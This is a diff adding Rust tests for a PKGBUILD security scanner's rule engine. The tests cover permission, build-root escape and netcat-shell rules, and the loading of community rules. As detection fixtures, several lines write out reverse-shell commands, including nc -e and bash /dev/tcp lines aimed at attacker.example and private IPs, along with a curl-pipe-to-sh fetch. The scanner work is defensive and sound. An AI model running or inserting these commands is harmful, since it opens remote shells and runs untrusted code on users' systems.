+        // /usr/bin under $pkgdir, which is not a user PATH prefix. A Critical
+        // false positive on the real article is worse than the residual gap.
+        for s in [
+            "install -Dm4755 sudo \"$pkgdir/usr/bin/sudo\"",
+            "cp \"$srcdir/sudo.conf\" \"$pkgdir/etc/sudo.conf\"",
+            "install -Dm644 sudoers \"$pkgdir/etc/sudoers\"",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-004"),
+                "the real sudo package must not trip ATOMIC-004 for: {s} -> {m:?}"
             );
         }
     }
@@ -3082,5 +3465,369 @@ mod tests {
                 "INSTALL-002 missed dropped script: {s} -> {m:?}"
             );
         }
+    }
+
+    /// Load the shipped community rules file into a fresh engine.
+    fn perm_engine() -> RuleEngine {
+        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/rules.d");
+        let mut engine = RuleEngine::new();
+        engine
+            .load_rules_from_dir(&path)
+            .expect("shipped rules.d must load");
+        engine
+    }
+
+    #[test]
+    fn shipped_permission_rules_catch_world_writable() {
+        let engine = perm_engine();
+        let cases: &[(&str, &str)] = &[
+            (r#"chmod 777 "$pkgdir/usr/bin/foo""#, "PERM-001"),
+            (r#"chmod -R 777 "$pkgdir/opt/app""#, "PERM-001"),
+            (r#"chmod 0777 "$pkgdir/opt/app""#, "PERM-001"),
+            (r#"chmod 666 "$pkgdir/etc/foo.conf""#, "PERM-001"),
+            (r#"chmod 757 "$pkgdir/opt/x""#, "PERM-001"),
+            (r#"chmod 772 "$pkgdir/opt/x""#, "PERM-001"),
+            (r#"install -Dm777 bin "$pkgdir/usr/bin/bin""#, "PERM-001"),
+            (r#"install -m 666 f "$pkgdir/etc/f""#, "PERM-001"),
+            (r#"chmod o+w "$pkgdir/etc/foo.conf""#, "PERM-002"),
+            (r#"chmod a+w "$pkgdir/opt/app""#, "PERM-002"),
+            (r#"chmod ugo+w "$pkgdir/opt/app""#, "PERM-002"),
+            (r#"chmod -R o+w "$pkgdir/opt/app""#, "PERM-002"),
+            (r#"chmod o=rw "$pkgdir/etc/f""#, "PERM-002"),
+        ];
+        for (src, id) in cases {
+            let m = engine.match_content(src, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| &x.rule_id.as_str() == id),
+                "{id} missed world-writable: {src} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shipped_permission_rules_ignore_ordinary_modes() {
+        // This is the whole difficulty of the rule (issue #8). These forms are
+        // in essentially every PKGBUILD ever written; a rule that fires on them
+        // teaches people to ignore the tool.
+        let engine = perm_engine();
+        for src in [
+            r#"chmod 755 "$pkgdir/usr/bin/foo""#,
+            r#"chmod 0755 "$pkgdir/usr/bin/foo""#,
+            r#"chmod 644 "$pkgdir/usr/share/foo/data""#,
+            r#"chmod 0644 "$pkgdir/usr/share/foo/data""#,
+            r#"chmod 700 "$pkgdir/var/lib/foo""#,
+            r#"chmod 600 "$pkgdir/etc/foo.key""#,
+            r#"chmod 111 "$pkgdir/opt/x""#,
+            r#"chmod -R 755 "$pkgdir/usr/share/foo""#,
+            r#"chmod 1777 "$pkgdir/var/tmp/foo""#,
+            r#"install -Dm644 LICENSE "$pkgdir/usr/share/licenses/foo/LICENSE""#,
+            r#"install -Dm755 target/release/foo "$pkgdir/usr/bin/foo""#,
+            r#"install -m 644 README "$pkgdir/usr/share/doc/foo/README""#,
+            r#"chmod u+x "$pkgdir/usr/bin/foo""#,
+            r#"chmod +x "$pkgdir/usr/bin/foo""#,
+            r#"chmod a+r "$pkgdir/usr/share/foo/data""#,
+            r#"chmod g+w "$pkgdir/var/lib/foo""#,
+            r#"chmod u+rw "$pkgdir/etc/foo""#,
+            r#"chmod o-w "$pkgdir/etc/foo""#,
+            r#"chmod a-w "$pkgdir/etc/foo""#,
+        ] {
+            let m = engine.match_content(src, FileType::Pkgbuild);
+            let hits: Vec<&str> = m
+                .iter()
+                .map(|x| x.rule_id.as_str())
+                .filter(|id| id.starts_with("PERM-"))
+                .collect();
+            assert!(
+                hits.is_empty(),
+                "ordinary mode must not fire a PERM rule: {src} -> {hits:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn escape001_catches_writes_outside_the_build_root() {
+        let engine = RuleEngine::default();
+        for src in [
+            r#"tar xf payload.tar.gz -C /"#,
+            r#"tar -xzf blob.tar.gz -C /usr"#,
+            r#"bsdtar xf x.tar -C /etc/"#,
+            r#"unzip -q payload.zip -d /opt"#,
+            r#"install -Dm755 helper /usr/bin/helper"#,
+        ] {
+            let m = engine.match_content(src, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ESCAPE-001"),
+                "ESCAPE-001 missed a write outside the build root: {src} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn escape001_is_quiet_on_normal_packaging() {
+        // These are what essentially every PKGBUILD does. A rule that fires on
+        // them is worse than no rule.
+        let engine = RuleEngine::default();
+        for src in [
+            r#"tar xf source.tar.gz -C "$srcdir""#,
+            r#"tar -xzf x.tar.gz -C "$pkgdir/usr/share""#,
+            r#"unzip -q app.zip -d "$srcdir/app""#,
+            r#"install -Dm755 tool "$pkgdir/usr/bin/tool""#,
+            r#"install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE""#,
+            r#"cp -a build/. "$pkgdir/usr/lib/foo/""#,
+            r#"mv "$srcdir/x" "$pkgdir/opt/x""#,
+            r#"install -d "$pkgdir/etc/foo""#,
+            r#"make DESTDIR="$pkgdir" install"#,
+            r#"cp config.example "$pkgdir/etc/foo/config""#,
+            // Reading FROM an absolute path is fine; only writing TO one is not.
+            r#"install -Dm644 /usr/share/foo/template "$pkgdir/etc/foo.conf""#,
+            r#"cp /etc/ssl/certs/ca-bundle.crt "$srcdir/""#,
+        ] {
+            let m = engine.match_content(src, FileType::Pkgbuild);
+            let hits: Vec<&str> = m
+                .iter()
+                .map(|x| x.rule_id.as_str())
+                .filter(|id| id.starts_with("ESCAPE-"))
+                .collect();
+            assert!(
+                hits.is_empty(),
+                "ESCAPE-001 false positive on ordinary packaging: {src} -> {hits:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell002_no_fp_on_words_ending_in_nc() {
+        // Issue #32: `nc\s+.*-c\s+` matched the `nc` at the END of `MEGAsync`,
+        // turning a routine submodule checkout into a Critical reverse shell.
+        // Any word ending in `nc` followed by a `-c`/`-e` flag is the same trap.
+        let engine = RuleEngine::default();
+        for s in [
+            "git -C MEGAsync -c protocol.file.allow='always' submodule update",
+            "git -C MEGAsync -c protocol.file.allow=always submodule update --init",
+            "cd sync -c foo",
+            "./configure --with-func -e something",
+            "meson setup builddir -Dsync -c release",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "SHELL-002"),
+                "SHELL-002 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell002_still_catches_real_netcat_shells() {
+        let engine = RuleEngine::default();
+        for s in [
+            "nc -e /bin/sh 10.0.0.1 4444",
+            "nc -c /bin/bash attacker.example 9001",
+            "ncat -e /bin/bash 10.0.0.1 4444",
+            "netcat -e /bin/sh 1.2.3.4 1234",
+            "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
+            "nc -nve /bin/sh 10.0.0.1 4444",
+            "ncat --sh-exec '/bin/bash' 10.0.0.1 4444",
+            "cat /etc/passwd | nc -e /bin/sh 10.0.0.1 4444",
+            "foo && nc -e /bin/sh 10.0.0.1 4444",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "SHELL-002"),
+                "SHELL-002 missed a real netcat shell: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell002_does_not_borrow_a_flag_from_a_later_command() {
+        // The execute flag must belong to the netcat invocation itself. A
+        // benign `-c` on a *different* command later in the same line must not
+        // complete the match.
+        let engine = RuleEngine::default();
+        for s in [
+            "nc -z example.com 80; git -c core.pager=cat log",
+            "nc -zv host 443 && git -c protocol.file.allow=always submodule update",
+            "nc -z host 80 | grep -c open",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "SHELL-002"),
+                "SHELL-002 borrowed a flag across a separator: {s} -> {m:?}"
+            );
+        }
+    }
+
+    // ---- community rule loading: collisions, privilege, bad input ----
+
+    fn write_rule(dir: &Path, file: &str, body: &str) {
+        std::fs::write(dir.join(file), body).unwrap();
+    }
+
+    const OK_RULE: &str = r#"
+[[rule]]
+id = "COMM-001"
+name = "n"
+description = "d"
+severity = "high"
+category = "malicious_code"
+recommendation = "r"
+[[rule.patterns]]
+type = "regex"
+pattern = "zzzmarker"
+"#;
+
+    #[test]
+    fn community_rule_cannot_shadow_or_lower_a_builtin() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "evil.toml",
+            r#"
+[[rule]]
+id = "SHELL-001"
+name = "lowered"
+description = "d"
+severity = "info"
+category = "malicious_code"
+recommendation = "r"
+[[rule.patterns]]
+type = "regex"
+pattern = "neverMatchesAnything12345"
+"#,
+        );
+        let mut engine = RuleEngine::default();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        let rule = engine.get_rule("SHELL-001").unwrap();
+        assert_eq!(rule.severity, Severity::Critical, "builtin was lowered");
+        assert_ne!(rule.name, "lowered");
+        let m = engine.match_content("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", FileType::Pkgbuild);
+        assert!(m.iter().any(|x| x.rule_id == "SHELL-001"));
+    }
+
+    #[test]
+    fn add_rule_rejects_duplicate_id() {
+        let mut engine = RuleEngine::default();
+        let mut dup = get_builtin_rules().remove(0);
+        dup.severity = Severity::Info;
+        assert!(engine.add_rule(dup).is_err());
+    }
+
+    #[test]
+    fn catalog_and_engine_share_the_vetting_loader() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "a.toml",
+            &OK_RULE.replace("COMM-001", "SHELL-001"),
+        );
+        write_rule(dir.path(), "b.toml", OK_RULE);
+        let cat = crate::catalog::Catalog::load_with(&[dir.path().to_path_buf()]);
+        assert_eq!(cat.validate(), Ok(()));
+        assert!(cat.get("COMM-001").is_some());
+        assert_eq!(cat.get("SHELL-001").unwrap().owner, "rules");
+    }
+
+    #[test]
+    fn user_rule_dirs_for_root_excludes_user_config() {
+        let root = user_rule_dirs_for(true);
+        assert_eq!(root.len(), 2);
+        assert!(root
+            .iter()
+            .all(|p| p.starts_with("/usr") || p.starts_with("/etc")));
+        assert!(user_rule_dirs_for(false).len() >= root.len());
+    }
+
+    #[test]
+    fn bad_regex_skips_only_its_own_rule() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "a_bad.toml",
+            &OK_RULE
+                .replace("COMM-001", "COMM-BAD")
+                .replace("zzzmarker", "(unclosed"),
+        );
+        write_rule(dir.path(), "b_good.toml", OK_RULE);
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        assert!(engine.get_rule("COMM-BAD").is_none());
+        assert!(engine.get_rule("COMM-001").is_some());
+    }
+
+    #[test]
+    fn unknown_keys_skip_the_file() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "typo.toml",
+            &OK_RULE
+                .replace("COMM-001", "COMM-TYPO")
+                .replace("[[rule.patterns]]", "[[rule.patern]]"),
+        );
+        write_rule(
+            dir.path(),
+            "ft.toml",
+            &OK_RULE
+                .replace("COMM-001", "COMM-FT")
+                .replace("severity", "file_type = \"pkgbuild\"\nseverity"),
+        );
+        write_rule(dir.path(), "ok.toml", OK_RULE);
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        assert!(engine.get_rule("COMM-TYPO").is_none());
+        assert!(engine.get_rule("COMM-FT").is_none());
+        assert!(engine.get_rule("COMM-001").is_some());
+    }
+
+    #[test]
+    fn rule_with_no_patterns_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        let no_pat = OK_RULE.replace("COMM-001", "COMM-EMPTY").replace(
+            "[[rule.patterns]]\ntype = \"regex\"\npattern = \"zzzmarker\"\n",
+            "",
+        );
+        write_rule(dir.path(), "e.toml", &no_pat);
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        assert!(engine.get_rule("COMM-EMPTY").is_none());
+    }
+
+    #[test]
+    fn source_file_rules_fire_on_sidecars_and_pkgbuild_rules_apply_too() {
+        let dir = tempfile::tempdir().unwrap();
+        write_rule(
+            dir.path(),
+            "sf.toml",
+            &OK_RULE.replace("severity", "file_types = [\"source_file\"]\nseverity"),
+        );
+        let mut engine = RuleEngine::default();
+        engine.load_rules_from_dir(dir.path()).unwrap();
+        let m = engine.match_content("run zzzmarker", FileType::SourceFile);
+        assert!(m.iter().any(|x| x.rule_id == "COMM-001"));
+        // A built-in PKGBUILD rule also covers sidecars.
+        let m = engine.match_content(
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            FileType::SourceFile,
+        );
+        assert!(m.iter().any(|x| x.rule_id == "SHELL-001"));
+    }
+
+    #[test]
+    fn two_patterns_on_one_line_report_once() {
+        let engine = RuleEngine::default();
+        let line = "curl https://pastebin.com/raw/abc | sh";
+        let m = engine.match_content(line, FileType::Pkgbuild);
+        let n = m.iter().filter(|x| x.rule_id == "PASTE-001").count();
+        assert_eq!(n, 1, "PASTE-001 reported {n}x for one line: {m:?}");
+    }
+
+    #[test]
+    fn shipped_example_rules_still_load_under_strict_parsing() {
+        // The strict (deny_unknown_fields) loader must not reject the example
+        // rule file we ship for authors to copy.
+        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/rules.d");
+        let mut engine = RuleEngine::new();
+        engine.load_rules_from_dir(&dir).unwrap();
+        assert!(engine.get_rule("EXAMPLE-001").is_some());
     }
 }
